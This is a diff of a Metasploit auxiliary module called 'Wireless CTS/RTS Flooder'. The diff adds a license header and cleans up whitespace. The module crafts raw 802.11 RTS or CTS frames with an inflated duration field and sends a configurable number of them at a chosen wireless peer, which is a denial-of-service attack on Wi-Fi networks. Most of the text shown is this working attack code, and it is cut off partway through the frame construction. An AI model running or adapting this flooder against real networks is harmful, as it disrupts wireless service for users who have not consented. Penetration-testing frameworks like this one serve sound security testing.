@@ -1,18 +1,29 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Lorcon2
 	include Msf::Auxiliary::Dos
-	
+
 	def initialize(info ={})
 		super(update_info(info,
 			'Name'		=> 'Wireless CTS/RTS Flooder',
 			'Description' 	=> %q{
 	      				This module sends 802.11 CTS/RTS requests to a specific wireless peer,
-					using the specified source address,	
+					using the specified source address,
 					},
-			
+
 			'Author'	=> [ 'Brad Antoniewicz' ],
 			'License'	=> MSF_LICENSE,
 			'Version'	=> '$Revision$'
@@ -37,21 +48,21 @@ class Metasploit3 < Msf::Auxiliary
 			when 'CTS'
 
 				frame =create_cts()
-			else 
+			else
 				print_status("No TYPE selected!!")
-				return	
+				return
 		end
-	
-		open_wifi	
+
+		open_wifi
 		print_status("Sending #{datastore['NUM']} #{datastore['TYPE'].upcase} frames.....")
 
 		datastore['NUM'].to_i.times do
 			wifi.write(frame)
 		end
 
-	end	
+	end
 	def create_rts
-		
+
 		frame =
 			"\xb4" +			# Type/SubType
 			"\x00" +			# Flags
@@ -62,8 +73,8 @@ class Metasploit3 < Msf::Auxiliary
 		return frame
 	end
 	def create_cts
-		
-		frame = 
+
+		frame =
 			"\xc4" +			# Type/SubType
 			"\x00" +			# Flags
 			"\xff\x7f" +			# Duration
